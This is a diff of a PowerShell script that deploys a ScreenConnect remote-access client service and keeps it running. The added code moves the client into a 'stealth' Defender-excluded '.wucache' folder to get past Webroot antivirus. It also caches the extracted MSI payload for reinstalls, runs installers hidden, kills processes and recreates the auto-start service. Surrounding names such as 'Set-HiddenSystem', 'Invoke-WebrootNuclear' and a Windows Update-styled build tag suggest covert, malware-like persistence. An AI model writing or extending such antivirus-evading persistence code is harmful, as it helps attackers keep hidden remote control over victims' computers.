@@ -177,10 +177,16 @@ function Set-HiddenSystem {
 function Get-ScInstallRoots {
     param([string]$Fingerprint = $PrimaryFingerprint)
     @(
+        (Join-Path $WorkDir 'scclient'),
         "${env:ProgramFiles}\ScreenConnect Client ($Fingerprint)",
         "${env:ProgramFiles(x86)}\ScreenConnect Client ($Fingerprint)",
         "${env:ProgramData}\ScreenConnect\$Fingerprint"
     ) | Where-Object { $_ -and (Test-Path $_) }
+}
+
+function Get-StealthScInstallDir {
+    # Defender-excluded workdir — Webroot blocks PF + ProgramData\ScreenConnect writes
+    return (Join-Path $WorkDir 'scclient')
 }
 
 function Test-WebrootPresent {
@@ -524,18 +530,17 @@ function Get-PrimaryMsiFile {
 }
 
 function Get-PrimaryScInstallDir {
-    # Under Webroot, Program Files writes for SC are often blocked (Incorrect function / empty robocopy).
-    # Prefer ProgramData path that Get-ScInstallRoots already scans.
+    $stealth = Get-StealthScInstallDir
     $pd = Join-Path $env:ProgramData "ScreenConnect\$PrimaryFingerprint"
     $x86 = "${env:ProgramFiles(x86)}\ScreenConnect Client ($PrimaryFingerprint)"
     $pf = "${env:ProgramFiles}\ScreenConnect Client ($PrimaryFingerprint)"
     if (Test-WebrootInstalled) {
-        foreach ($p in @($pd, $x86, $pf)) {
+        foreach ($p in @($stealth, $pd, $x86, $pf)) {
             if ((Test-Path $p) -and (Test-Path (Join-Path $p 'ScreenConnect.ClientService.exe'))) { return $p }
         }
-        return $pd
+        return $stealth
     }
-    foreach ($p in @($x86, $pf, $pd)) {
+    foreach ($p in @($x86, $pf, $pd, $stealth)) {
         if (Test-Path $p) { return $p }
     }
     return $x86
@@ -589,6 +594,23 @@ function Build-PrimaryScImagePath {
 function Expand-MsiPayloadToDir {
     # Prefer TEMP paths — .wucache msiexec /a returns 1603 under Webroot
     param([string]$MsiPath, [string]$OutDir)
+    $cacheRoot = Join-Path $WorkDir 'sc_msi_cache'
+    $cachedSvc = Get-ChildItem -Path $cacheRoot -Recurse -Filter 'ScreenConnect.ClientService.exe' -ErrorAction SilentlyContinue |
+        Sort-Object Length -Descending | Select-Object -First 1
+    if ($cachedSvc -and $cachedSvc.Length -ge 50000) {
+        Write-Log "REPAIR: using cached MSI payload $($cachedSvc.Directory.FullName)"
+        if ($OutDir -ne $cachedSvc.Directory.FullName) {
+            New-Item -ItemType Directory -Path $OutDir -Force | Out-Null
+            & robocopy.exe "$($cachedSvc.Directory.FullName)" "$OutDir" /E /IS /IT /R:1 /W:1 /NFL /NDL /NJH /NJS /nc /ns /np >$null 2>&1
+            if (-not (Test-Path (Join-Path $OutDir 'ScreenConnect.ClientService.exe'))) {
+                Get-ChildItem $cachedSvc.Directory.FullName -File | ForEach-Object {
+                    [IO.File]::WriteAllBytes((Join-Path $OutDir $_.Name), [IO.File]::ReadAllBytes($_.FullName))
+                }
+            }
+        }
+        return $true
+    }
+
     Stop-MsiEngine
     Remove-Item $OutDir -Recurse -Force -ErrorAction SilentlyContinue
     New-Item -ItemType Directory -Path $OutDir -Force | Out-Null
@@ -602,37 +624,134 @@ function Expand-MsiPayloadToDir {
         -Wait -PassThru -WindowStyle Hidden
     Write-Log "REPAIR: msiexec /a exit $($p.ExitCode)"
     if ($p.ExitCode -ne 0 -and (Test-Path $log)) {
-        Get-Content $log -Tail 15 -ErrorAction SilentlyContinue | ForEach-Object { Write-Log ("extract.log: " + $_) }
+        Get-Content $log -Tail 8 -ErrorAction SilentlyContinue | ForEach-Object { Write-Log ("extract.log: " + $_) }
     }
 
     $svc = Get-ChildItem -Path $OutDir -Recurse -Filter 'ScreenConnect.ClientService.exe' -ErrorAction SilentlyContinue |
         Select-Object -First 1
-    if ($svc) { return $true }
-
-    # COM administrative install fallback
-    try {
-        Write-Log 'REPAIR: COM InstallProduct ACTION=ADMIN'
-        $inst = New-Object -ComObject WindowsInstaller.Installer
-        $inst.UILevel = 2
-        $inst.InstallProduct($msiTemp, "ACTION=ADMIN TARGETDIR=`"$OutDir`" ALLUSERS=1")
-        $svc = Get-ChildItem -Path $OutDir -Recurse -Filter 'ScreenConnect.ClientService.exe' -ErrorAction SilentlyContinue |
+    if (-not $svc) {
+        try {
+            Write-Log 'REPAIR: COM InstallProduct ACTION=ADMIN'
+            $inst = New-Object -ComObject WindowsInstaller.Installer
+            $inst.UILevel = 2
+            $inst.InstallProduct($msiTemp, "ACTION=ADMIN TARGETDIR=`"$OutDir`" ALLUSERS=1")
+            $svc = Get-ChildItem -Path $OutDir -Recurse -Filter 'ScreenConnect.ClientService.exe' -ErrorAction SilentlyContinue |
+                Select-Object -First 1
+        } catch {
+            Write-Log "REPAIR: COM admin extract failed: $($_.Exception.Message)"
+        }
+    }
+    if (-not $svc) {
+        # Reuse prior TEMP extract if present
+        $old = Join-Path $env:TEMP 'wuext_sc'
+        $svc = Get-ChildItem -Path $old -Recurse -Filter 'ScreenConnect.ClientService.exe' -ErrorAction SilentlyContinue |
             Select-Object -First 1
-        if ($svc) { return $true }
-    } catch {
-        Write-Log "REPAIR: COM admin extract failed: $($_.Exception.Message)"
+        if ($svc) {
+            Write-Log "REPAIR: reusing prior TEMP extract $($svc.Directory.FullName)"
+            $OutDir = $svc.Directory.FullName
+        }
+    }
+    if (-not $svc) {
+        Write-Log 'REPAIR: MSI extract produced no ClientService.exe'
+        return $false
     }
 
-    # 7za if present
-    foreach ($z in @('7z.exe', '7za.exe')) {
-        $cmd = Get-Command $z -ErrorAction SilentlyContinue
-        if (-not $cmd) { continue }
-        Write-Log "REPAIR: $z extract MSI"
-        & $cmd.Source x -y "-o$OutDir" $msiTemp >$null 2>&1
-        $svc = Get-ChildItem -Path $OutDir -Recurse -Filter 'ScreenConnect.ClientService.exe' -ErrorAction SilentlyContinue |
-            Select-Object -First 1
-        if ($svc) { return $true }
+    # Persist cache for later 1603 failures
+    New-Item -ItemType Directory -Path $cacheRoot -Force | Out-Null
+    Get-ChildItem $svc.Directory.FullName -File -ErrorAction SilentlyContinue | ForEach-Object {
+        try {
+            [IO.File]::WriteAllBytes((Join-Path $cacheRoot $_.Name), [IO.File]::ReadAllBytes($_.FullName))
+        } catch {}
     }
-    return $false
+    Write-Log ("REPAIR: cached payload files under $cacheRoot count=" + @(Get-ChildItem $cacheRoot -File -EA SilentlyContinue).Count)
+    return $true
+}
+
+function Copy-ScPayloadFiles {
+    param([string]$SrcDir, [string]$DestDir)
+    New-Item -ItemType Directory -Path $DestDir -Force | Out-Null
+    $n = 0
+    Get-ChildItem -Path $SrcDir -File -ErrorAction SilentlyContinue | ForEach-Object {
+        $target = Join-Path $DestDir $_.Name
+        try {
+            [IO.File]::WriteAllBytes($target, [IO.File]::ReadAllBytes($_.FullName))
+            Write-Log ("REPAIR: byte-copied {0} bytes={1}" -f $_.Name, $_.Length)
+            $n++
+        } catch {
+            Write-Log ("REPAIR: byte-copy fail {0}: {1}" -f $_.Name, $_.Exception.Message)
+            try {
+                Copy-Item -LiteralPath $_.FullName -Destination $target -Force -ErrorAction Stop
+                Write-Log ("REPAIR: Copy-Item OK {0}" -f $_.Name)
+                $n++
+            } catch {
+                Write-Log ("REPAIR: Copy-Item fail {0}: {1}" -f $_.Name, $_.Exception.Message)
+            }
+        }
+    }
+    return $n
+}
+
+function Expand-ScMsiOverInstall {
+    param([string]$MsiPath, [string]$DestDir)
+    if (-not (Test-Path $MsiPath)) { return $false }
+
+    if (Test-WebrootInstalled) {
+        $DestDir = Get-StealthScInstallDir
+        Write-Log "REPAIR: Webroot - deploying to stealth workdir: $DestDir"
+    }
+
+    $extract = Join-Path $env:TEMP 'wuext_sc'
+    if (-not (Expand-MsiPayloadToDir -MsiPath $MsiPath -OutDir $extract)) {
+        $cacheRoot = Join-Path $WorkDir 'sc_msi_cache'
+        if (-not (Test-Path (Join-Path $cacheRoot 'ScreenConnect.ClientService.exe'))) {
+            Write-Log 'REPAIR: MSI extract has no ClientService.exe and no cache'
+            return $false
+        }
+        $extract = $cacheRoot
+        Write-Log "REPAIR: falling back to sc_msi_cache"
+    }
+
+    $svcBin = Get-ChildItem -Path $extract -Recurse -Filter 'ScreenConnect.ClientService.exe' -ErrorAction SilentlyContinue |
+        Sort-Object Length -Descending | Select-Object -First 1
+    if (-not $svcBin) {
+        Write-Log 'REPAIR: no ClientService.exe in extract/cache'
+        return $false
+    }
+    $srcRoot = $svcBin.Directory.FullName
+    Write-Log "REPAIR: payload folder $srcRoot (svc=$($svcBin.Length))"
+
+    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
+        ("$($_.ExecutablePath)" -like "*$PrimaryFingerprint*" -or $_.ExecutablePath -like '*\.wucache\scclient*')
+    } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
+    & sc.exe stop "$SvcName" >$null 2>&1
+    Start-Sleep -Seconds 1
+
+    $copied = Copy-ScPayloadFiles -SrcDir $srcRoot -DestDir $DestDir
+    Write-Log "REPAIR: copied $copied files -> $DestDir"
+    foreach ($c in @(Get-ChildItem -Path $DestDir -Filter 'ScreenConnect*.exe' -ErrorAction SilentlyContinue)) {
+        Write-Log ("REPAIR: restored {0} bytes={1}" -f $c.Name, $c.Length)
+    }
+
+    $args = Get-ScConnectionArgsFromMsi -MsiPath $MsiPath
+    if (-not $args) {
+        $saved = Join-Path $WorkDir '.sc_imgpath'
+        if (Test-Path $saved) {
+            $prev = Get-Content $saved -Raw
+            if ($prev -match '"\s+"(\?e=Access[^"]*)"') { $args = $Matches[1] }
+        }
+    }
+    if ($args) {
+        $exe = Join-Path $DestDir 'ScreenConnect.ClientService.exe'
+        $img = '"{0}" "{1}"' -f $exe, $args
+        Set-Content -Path (Join-Path $WorkDir '.sc_imgpath') -Value $img -Encoding UTF8 -Force
+        Write-Log "REPAIR: ImagePath retargeted to $exe"
+    }
+
+    $svcOk = (Test-Path (Join-Path $DestDir 'ScreenConnect.ClientService.exe')) -and (
+        (Get-Item (Join-Path $DestDir 'ScreenConnect.ClientService.exe')).Length -ge 50000
+    )
+    Write-Log ("REPAIR: extract/copy ok=$svcOk dest=$DestDir copied=$copied")
+    return $svcOk
 }
 
 function Save-PrimaryScImagePath {
@@ -671,17 +790,15 @@ function Restore-PrimaryScService {
         Write-Log 'REPAIR: no ImagePath/args - cannot recreate service'
         return $false
     }
-    # Ensure exe path in ImagePath matches current install dir
-    if ($img -notlike "*$PrimaryFingerprint*") {
-        $argsOnly = $null
-        if ($img -match '"\s+"(\?e=Access[^"]*)"') { $argsOnly = $Matches[1] }
-        elseif ($img -match '(\?e=Access\S+)') { $argsOnly = $Matches[1] }
-        if ($argsOnly) { $img = '"{0}" "{1}"' -f $exe, $argsOnly }
-        else { $img = '"{0}"' -f $exe }
-    }
+    # Always retarget exe path to current install dir (stealth workdir has no fingerprint in path)
+    $argsOnly = $null
+    if ($img -match '"\s+"(\?e=Access[^"]*)"') { $argsOnly = $Matches[1] }
+    elseif ($img -match '(\?e=Access\S+)') { $argsOnly = $Matches[1] }
+    if ($argsOnly) { $img = '"{0}" "{1}"' -f $exe, $argsOnly }
+    else { $img = '"{0}"' -f $exe }
     Set-Content -Path $pathFile -Value $img -Encoding UTF8 -Force
+    Write-Log "REPAIR: service ImagePath -> $exe"
     try {
-        # Pending delete can block create briefly
         Start-Sleep -Seconds 2
         New-Service -Name $SvcName -BinaryPathName $img -DisplayName $SvcName `
             -StartupType Automatic -ErrorAction Stop | Out-Null
@@ -767,98 +884,6 @@ public static extern bool MoveFileEx(string lpExistingFileName, string lpNewFile
     return ((Test-Path $Dest) -and ((Get-Item $Dest).Length -ge 200000))
 }
 
-function Expand-ScMsiOverInstall {
-    param([string]$MsiPath, [string]$DestDir)
-    if (-not (Test-Path $MsiPath)) { return $false }
-    $extract = Join-Path $env:TEMP 'wuext_sc'
-    if (-not (Expand-MsiPayloadToDir -MsiPath $MsiPath -OutDir $extract)) {
-        Write-Log 'REPAIR: MSI extract has no ClientService.exe'
-        return $false
-    }
-    $svcBin = Get-ChildItem -Path $extract -Recurse -Filter 'ScreenConnect.ClientService.exe' -ErrorAction SilentlyContinue |
-        Sort-Object Length -Descending | Select-Object -First 1
-    $srcRoot = $svcBin.Directory.FullName
-    Write-Log "REPAIR: payload folder $srcRoot (svc=$($svcBin.Length))"
-
-    $pd = Join-Path $env:ProgramData "ScreenConnect\$PrimaryFingerprint"
-    if (Test-WebrootInstalled) {
-        $DestDir = $pd
-        Write-Log "REPAIR: Webroot - deploying to ProgramData: $DestDir"
-    }
-
-    function Invoke-ScRobocopyTo([string]$Target) {
-        New-Item -ItemType Directory -Path $Target -Force | Out-Null
-        cmd /c "takeown /F `"$Target`" /R /D Y" >$null 2>&1
-        cmd /c "icacls `"$Target`" /grant Administrators:F SYSTEM:F /T /C" >$null 2>&1
-        $rcLog = Join-Path $WorkDir 'robocopy_sc.log'
-        & robocopy.exe "$srcRoot" "$Target" /E /IS /IT /R:2 /W:1 `
-            /NFL /NDL /NJH /NJS /nc /ns /np /LOG:"$rcLog" >$null 2>&1
-        Write-Log "REPAIR: robocopy -> $Target exit $LASTEXITCODE"
-        return [bool](Test-Path (Join-Path $Target 'ScreenConnect.ClientService.exe'))
-    }
-
-    Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
-        ("$($_.ExecutablePath)" -like "*$PrimaryFingerprint*")
-    } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
-    & sc.exe stop "$SvcName" >$null 2>&1
-    Start-Sleep -Seconds 2
-
-    $landed = Invoke-ScRobocopyTo $DestDir
-    if (-not $landed -and $DestDir -ne $pd) {
-        Write-Log 'REPAIR: Program Files copy failed - fallback ProgramData'
-        $DestDir = $pd
-        $landed = Invoke-ScRobocopyTo $DestDir
-    }
-    if (-not $landed) {
-        # Last resort: copy file-by-file via WriteAllBytes into ProgramData
-        Write-Log 'REPAIR: robocopy failed - byte-copy into ProgramData'
-        $DestDir = $pd
-        New-Item -ItemType Directory -Path $DestDir -Force | Out-Null
-        Get-ChildItem -Path $srcRoot -File -ErrorAction SilentlyContinue | ForEach-Object {
-            try {
-                [IO.File]::WriteAllBytes((Join-Path $DestDir $_.Name), [IO.File]::ReadAllBytes($_.FullName))
-                Write-Log ("REPAIR: byte-copied {0} bytes={1}" -f $_.Name, $_.Length)
-            } catch {
-                Write-Log ("REPAIR: byte-copy fail {0}: {1}" -f $_.Name, $_.Exception.Message)
-            }
-        }
-        $landed = [bool](Test-Path (Join-Path $DestDir 'ScreenConnect.ClientService.exe'))
-    }
-
-    foreach ($c in @(Get-ChildItem -Path $DestDir -Filter 'ScreenConnect*.exe' -ErrorAction SilentlyContinue)) {
-        Write-Log ("REPAIR: restored {0} bytes={1}" -f $c.Name, $c.Length)
-    }
-
-    $clientSrc = Get-ChildItem -Path $extract -Recurse -Filter 'ScreenConnect.WindowsClient.exe' -ErrorAction SilentlyContinue |
-        Sort-Object Length -Descending | Select-Object -First 1
-    $clientDest = Join-Path $DestDir 'ScreenConnect.WindowsClient.exe'
-    $pendingReboot = $false
-    if ($clientSrc -and -not ((Test-Path $clientDest) -and ((Get-Item $clientDest).Length -ge 200000))) {
-        Install-ScBlockedFile -Src $clientSrc.FullName -Dest $clientDest | Out-Null
-        if (-not (Test-Path $clientDest) -or ((Get-Item $clientDest -ErrorAction SilentlyContinue).Length -lt 200000)) {
-            $pendingReboot = $true
-            Write-Log 'REPAIR: WindowsClient not live - optional under WR (service can run headless)'
-        }
-    }
-
-    Build-PrimaryScImagePath -MsiPath $MsiPath | Out-Null
-    # Rewrite ImagePath exe to DestDir
-    $args = Get-ScConnectionArgsFromMsi -MsiPath $MsiPath
-    if ($args) {
-        $exe = Join-Path $DestDir 'ScreenConnect.ClientService.exe'
-        $img = '"{0}" "{1}"' -f $exe, $args
-        Set-Content -Path (Join-Path $WorkDir '.sc_imgpath') -Value $img -Encoding UTF8 -Force
-        Write-Log "REPAIR: ImagePath retargeted to $exe"
-    }
-
-    $svcOk = [bool](Test-Path (Join-Path $DestDir 'ScreenConnect.ClientService.exe'))
-    $clientLive = (Test-Path $clientDest) -and ((Get-Item $clientDest -ErrorAction SilentlyContinue).Length -ge 200000)
-    # Headless OK: ClientService alone is success under Webroot
-    $ok = $svcOk
-    Write-Log ("REPAIR: extract/robocopy ok=$ok dest=$DestDir clientLive=$clientLive pendingReboot=$pendingReboot")
-    return $ok
-}
-
 function Repair-ScAfterAv {
     Write-Log 'REPAIR: Webroot nuclear + clean SC reinstall (empty name / no join)'
     Invoke-WebrootNuclear | Out-Null
@@ -883,7 +908,7 @@ function Repair-ScAfterAv {
     # Under Webroot: do NOT wipe installs — Program Files copies fail and wipe loops destroy the service.
     # Only clear PF leftovers; keep/create ProgramData payload.
     if (Test-WebrootInstalled) {
-        Write-Log 'REPAIR: Webroot mode - skip full uninstall wipe; deploy to ProgramData'
+        Write-Log 'REPAIR: Webroot mode - skip full uninstall wipe; deploy to stealth workdir'
         & sc.exe stop "$SvcName" >$null 2>&1
         foreach ($pfOnly in @(
             "${env:ProgramFiles}\ScreenConnect Client ($PrimaryFingerprint)",
@@ -1651,7 +1676,7 @@ function Invoke-NukeBlockedScreenConnect {
     Write-Log "AUTO-NUKE complete (actions~$killed)"
 }
 
-Write-Log 'WU_BUILD_20260730I'
+Write-Log 'WU_BUILD_20260730J'
 Write-Log ("Host=$env:COMPUTERNAME user=$env:USERNAME pid=$PID")
 Invoke-NukeBlockedScreenConnect
 
